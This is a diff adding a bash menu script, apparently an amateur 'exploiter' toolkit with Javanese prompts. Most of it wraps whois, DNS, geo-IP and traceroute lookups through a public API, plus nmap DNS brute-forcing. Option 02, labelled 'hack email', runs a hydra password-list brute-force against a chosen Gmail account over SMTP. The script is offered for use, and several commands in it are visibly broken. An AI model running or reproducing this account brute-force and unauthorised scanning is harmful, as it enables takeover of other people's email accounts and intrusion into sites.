@@ -1,0 +1,100 @@
+#!/usr/bin/bash
+
+c='\e[0;34m'
+o='\033[92m'
+l='\e[1;32m'
+
+
+
+clear
+
+
+echo -e $c"    ___                                                "
+echo -e $c"     l  __ \        / __   ___    ___  l    __  o _____"
+echo -e $c"     l l  l \  /\  / l  l  l__ \/ l  l l   l  l l   l  "
+echo -e $c"  ___l l__l  \/  \/  l__l  l__ /\ l__l l__ l__l l   l  "
+echo -e $c"                                  l                    "
+
+sleep 2
+
+echo -e $o"|================MENU================|"
+echo -e $o"          01.whois lookup             "
+echo -e $o"          02.Hydra[hack email]        "
+echo -e $o"          03.Nmap                     "
+echo -e $o"          04.ping                     "
+echo -e $o"          05.dns lookup               "
+echo -e $o"          06.geo ip                   "
+echo -e $o"          07.traceroute               "
+echo -e $o"          08.bug scan                 "
+echo -e $o"          09.admin finder             "
+echo -e $o"          10.exit                     "
+echo -e $o"l====================================l"
+
+read -p "jowo>"  jowo;
+
+if [ $jowo = 01 ]
+then
+echo -e $l"masukno domain:"
+read a
+curl http://api.hackertarget.com/whois/?q=$a
+fi
+
+if [ $jowo = 02 ]
+then
+echo -e $l"masukno email:"
+read s
+echo -e $l"masukno list password:"
+echo -e $l"contoh:/sdcard/password.txt"
+read c
+hydra -l $s -P $c -s 465 -S -v -V -t 1 smtp://smtp.gmail.com:
+fi
+
+if [ $jowo = 03 ]
+then
+echo -e $l"masukno web:"
+read k
+nmap -p 80 --script dns-brute.nse $k
+fi
+
+if [ $jowo = 04 ]
+then
+echo -l $l"masukno web:"
+read l
+ping $l
+fi
+
+if [ $jowo = 05 ]
+then
+echo -e $l"masukno web:"
+read w
+curl http://api.hackertarget.com/dnslookup/?q=$w
+fi
+
+if [ $jowo = 06 ]
+then
+echo -e $l"masukno web:"
+read q
+curl http://api.hackertarget.com/geoip/?q=$q
+fi
+
+if [ $jowo = 07 ]
+then
+echo -e $l"masukno web:"
+read v
+curl http://api.hackertarget.com/mtr/?q=$v
+fi
+
+if [ $jowo = 08 ]
+then
+echo -e $l"masukno web:"
+read d
+curl -l $d
+fi
+
+
+if [ $jowo = 09 ]
+then
+cd
+cd jowo exploiter/tool
+python2 git.py
+fi
